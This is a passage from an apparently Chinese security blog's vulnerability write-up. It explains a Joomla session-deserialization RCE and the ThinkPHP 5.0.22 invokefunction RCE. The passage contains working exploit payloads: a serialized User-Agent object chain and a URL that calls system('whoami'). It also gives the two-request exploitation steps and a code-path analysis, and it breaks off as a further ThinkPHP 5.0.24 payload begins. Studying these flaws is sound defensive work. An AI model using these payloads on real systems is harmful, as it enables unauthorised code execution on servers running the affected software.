&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$result = str_replace(&amp;#x27;\0\0\0&amp;#x27;, chr(0) . &amp;#x27;*&amp;#x27; . chr(0), $result); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;给出我最终构造的 POC（既是上述 php 代码生成的 POC）：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: 123&amp;#125;__test|O:21:&amp;quot;JDatabaseDriverMysqli&amp;quot;:3:&amp;#123;s:4:&amp;quot;\0\0\0a&amp;quot;;O:17:&amp;quot;JSimplepieFactory&amp;quot;:0:&amp;#123;&amp;#125;s:21:&amp;quot;\0\0\0disconnectHandlers&amp;quot;;a:1:&amp;#123;i:0;a:2:&amp;#123;i:0;O:9:&amp;quot;SimplePie&amp;quot;:5:&amp;#123;s:8:&amp;quot;sanitize&amp;quot;;O:20:&amp;quot;JDatabaseDriverMysql&amp;quot;:0:&amp;#123;&amp;#125;s:5:&amp;quot;cache&amp;quot;;b:1;s:19:&amp;quot;cache_name_function&amp;quot;;s:6:&amp;quot;assert&amp;quot;;s:10:&amp;quot;javascript&amp;quot;;i:9999;s:8:&amp;quot;feed_url&amp;quot;;s:37:&amp;quot;phpinfo();JFactory::getConfig();exit;&amp;quot;;&amp;#125;i:1;s:4:&amp;quot;init&amp;quot;;&amp;#125;&amp;#125;s:13:&amp;quot;\0\0\0connection&amp;quot;;i:1;&amp;#125;ð&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//简单分析一下，123&amp;#125;是为了将前一个解析失败的键值对闭合,__是他的命名规范,后面使我们的恶意代码&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们再再再总结一下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1. 由于 Joomla 自定义 session 存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。而 php 5.6.13 以前在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。用 unserialize 解析键值，解析结果作为 session。但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。&lt;/p&gt;
&lt;p&gt;2. 我们利用（1）可以构造出我们自己的恶意代码的 payload，但是为什么要放在 User-agent 中捏？看图&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221115162408024.png&#34; alt=&#34;image-20221115162408024&#34; style=&#34;zoom: 50%;&#34; /&gt;
&lt;p&gt;因为 libraries/joomla/session/session.php 中，_validate 函数，将 ua 和 xff 调用 set 方法设置到了 session 中（session.client.browser 和 session.client.forwarded），并且这两个参数使我们可控的&lt;/p&gt;
&lt;p&gt;3. 为什么 exp 要按照上面的写捏，因为他除了截断和利用方式有所不同之外，触发函数都是相同滴&lt;/p&gt;
&lt;p&gt;4. 那么有人又要问，那么后面多出来的 session 咋办捏，他原来 session 后面还有 cookie 等字段。但我们使用四字节截断了，后面的东西都没啦，就是上面的那坨 ð&lt;/p&gt;
&lt;p&gt;5. 利用时我们仍需要进行两次发包，第一次不携带 cookie 和 User-agent，作用是将 cookie 存储进入数据库。第二次的 cookie 为第一个返回包中的 cookie，User-agent 为我们构造的恶意 payload，第二次发包时从数据库读取 session，造成 rce&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;thinkphp-5022-rce&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#thinkphp-5022-rce&#34;&gt;#&lt;/a&gt; Thinkphp 5.0.22 RCE&lt;/h3&gt;
&lt;p&gt;这里将 Thinkphp5.0.22 解包之后可以看到如下目录结构：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235402918-1496995877.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;根据类的命名空间可以快速定位文件位置，在 ThinkPHP5.0 的规范里面，命名空间其实对应了文件的所在目录，app 命名空间通常代表了文件的起始目录为 application，而 think 命名空间则代表了文件的其实目录为 thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201104235944649-946485747.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;Thinkphp 执行过程：&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120151418540.png&#34; alt=&#34;image-20221120151418540&#34; style=&#34;zoom:67%;&#34; /&gt;
&lt;p&gt;在具体分析流程前传参方式，首先介绍一下模块等参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模块 : application\index，这个 index 就是一个模块，负责前台相关&lt;/li&gt;
&lt;li&gt;控制器：在模块中的文件夹 controller，即为控制器，负责业务逻辑&lt;/li&gt;
&lt;li&gt;操作：在控制器中定义的方法，比如在默认文件夹中 application\index\controller\Index.php 中就有两个方法，index 和 hello&lt;/li&gt;
&lt;li&gt;参数：就是定义的操作需要传的参数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在本文中会用到两种传参方式，其他的方式可以自行了解&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1. PATH_INFO模式 : http://127.0.0.1/public/index.php/模块/控制器/操作/(参数名)/(参数值)...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2. 兼容模式 : http://127.0.0.1/public/index.php?s=/模块/控制器/操作&amp;amp;(参数名)=(参数值)...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果直接访问入口文件 index.php 的话，由于 URL 中没有模块、控制器和操作，因此系统会访问默认模块（index）下面的默认控制器（Index）的默认操作（index），因此下面的访问是等效的：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/thinkphp_5.0.22/public/index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/index/index&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 application\index\controller 目录下新建一个 Test.php，我们访问下面链接即可访问到 Test 控制器下的 hello 方法：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/thinkphp_5.0.22/public/index.php/index/test/hello/name/bmjoker&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;漏洞分析&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;payload：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/thinkphp_5.0.22/public/?s=index/think\app/invokefunction&amp;amp;function=call_user_func_array&amp;amp;vars[0]=system&amp;amp;vars[1][]=whoami&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;程序入口 public/index.php&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// [ 应用入口文件 ]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 定义应用目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;define(&amp;#x27;APP_PATH&amp;#x27;, __DIR__ . &amp;#x27;/../application/&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 加载框架引导文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require __DIR__ . &amp;#x27;/../thinkphp/start.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;public/start.php 会去调用 App 类的 run 方法&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;namespace think;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// ThinkPHP 引导文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 1. 加载基础文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;require __DIR__ . &amp;#x27;/base.php&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// 2. 执行应用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;App::run()-&amp;gt;send();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;run () 有两个比较重要的方法：routeCheck () 方法和 exec () 方法&lt;/p&gt;
&lt;p&gt;由于未设置调度信息，所以 $dispatch 为 null，进入 if 循环调用 routeCheck () 方法进行 URL 路由检测&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109231449360-339105155.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;跟进 routeCheck () 方法，看到最上面 $path 通过 path () 方法获取，值为 payload 中 s 后面的参数 &amp;quot;index/think\app/invokefunction&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000212836-250916839.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里可以尝试跟进一下 path () 方法：&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234256747-1493465291.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最后返回的&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mtext&gt;是&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;path是&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;是&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; pathinfo 获取来的，$pathinfo 又是通过 pathinfo () 方法获取来的，跟进 pathinfo () 方法&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201109234406178-487044200.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看到这里基本上就破案了，先判断通过 $_GET 方式传递过来的参数中有没有 s 传递过来的参数，如果有的话就获取，最后去掉两边的’ / &#39; 然后 return，也就是 &amp;quot;index/think\app/invokefunction&amp;quot;&lt;/p&gt;
&lt;p&gt;继续往下走，可以看到有如下判断&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$must = !is_null(self::$routeMust) ? self::$routeMust : $config[&amp;#x27;url_route_must&amp;#x27;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果开启了强制路由，那么输入的路由将报错导致后面导致程序无法运行，也就不存在 RCE 漏洞，但是默认是关闭的。&lt;/p&gt;
&lt;p&gt;最后调用 Route::parseUrl ()&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110000726472-759985507.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110001554366-91094100.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;先通过 str_replace () 函数将url(&#34;index/think\app/invokefunction&#34;)中的&#39; / &#39;替换成&#39; | &#39;，然后调用parseUrlPath对 url 进行分割，会把 index/\think\app/invokefunction 以’ / &#39; 为分隔符，分成 [‘index’,‘think\app’,‘invokefunction’]。&lt;/p&gt;
&lt;p&gt;根据 thinkphp 路由规则 index 为模块 、think\app 为控制器、invokefunction 为操作，最后封装成路由&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110002217354-1465544639.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;到这里为止 App::routeCheck () 方法才算走完&lt;/p&gt;
&lt;p&gt;继续往下读 App.php 的代码，关键代码在 App::exec 中，因为返回值中为 module，因此进入黄色部分&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110003646394-1878424898.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;跟进 module 方法，黄色部分检测 module 是否存在，不存在则报错。&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171434352-913856897.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110171606416-1486045006.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;上面代码表示只要&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mtext&gt;存在，并且&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;module存在，并且&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.69444em;vertical-align:0em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;存&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;在&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;并&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;且&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt; available 为 True，就可以初始化模块，并进行调用。&lt;/p&gt;
&lt;p&gt;继续往下看代码，构造控制器的过程调用了 Loder::controller 方法，然后又调用了 self::getModuleAndClass 该方法就是获取 Module、Class 的，这里通过判断name中是否存在&#39; \ &#39;，若存在class就是name，此时name，此时name为think\App，因此 class=think\App，至此就成功调用了 App 类&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172601127-1107177748.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110172622437-2009673675.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;控制器之后会获取当前的操作名，跟进 self::invokeMethod ()&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110173942307-1901023290.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;该方法里用了 ReflectionMethod 来构造 App 类的 invokefunction 方法，然后就是调用 App::invokefunction ()&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174034070-926914784.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;跟进 App::invokefunction ()，最后就是执行命令的地方，利用 ReflectionFunction，来构造自己想要的函数执行即可，&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mtext&gt;、&lt;/mtext&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;function、&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;o&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord cjk_fallback&#34;&gt;、&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;vars，都可以通过 $_GET 方式获取&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174321981-478185155.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;因此通过 url 传参 function=call_user_func_array&amp;amp;vars [0]=system&amp;amp;vars [1][]=whoami&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png&#34;&gt;&lt;img data-src=&#34;https://img2020.cnblogs.com/blog/1344396/202011/1344396-20201110174725217-873714846.png&#34; alt=&#34;img&#34;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;5.0.22 铺垫结束，其实真正的反序列化在 5.0.24，但利用条件苛刻，只有二次开发实现了反序列化才可以利用，在 /application/index/controller/Index.php 中添加反序列化反序列化触发点代码&lt;/p&gt;
&lt;p&gt;所以只给个 payload，开摆！&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span 